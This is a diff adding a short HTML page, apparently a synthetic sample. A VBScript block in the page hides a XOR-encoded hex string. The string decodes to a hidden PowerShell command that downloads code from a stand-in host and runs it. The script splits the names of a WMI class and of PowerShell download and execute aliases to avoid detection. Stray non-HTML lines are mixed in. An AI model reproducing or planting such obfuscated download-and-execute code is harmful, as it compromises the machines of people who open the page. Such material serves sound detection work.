@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+' generated-noise
+unused_generated = "AAAA"
+
+<html><head>
+<script type="text/javascript">var harmlessNoise = "noop";</script>
+<script type="text/vbscript">
+encoded = "746b736176776c61686824296a6b74242973246c6d6060616a246d7669246c7c7c74773e2b2b67606a2a617c65697468612a6d6a7265686d602b6661676b69612a707c702478246d617c"
+ps_cmd = XorHex(encoded, 4)
+runner = "powershell" & " -nop -w hidden"
+wmi = Join(Array("Win32", "_", "Process"), "")
+api = "i" & "rm"
+exec_alias = "i" & "ex"
+summary = ps_cmd & " :: " & wmi & " :: " & api & "/" & exec_alias
+</script>
+</head><body></body></html>
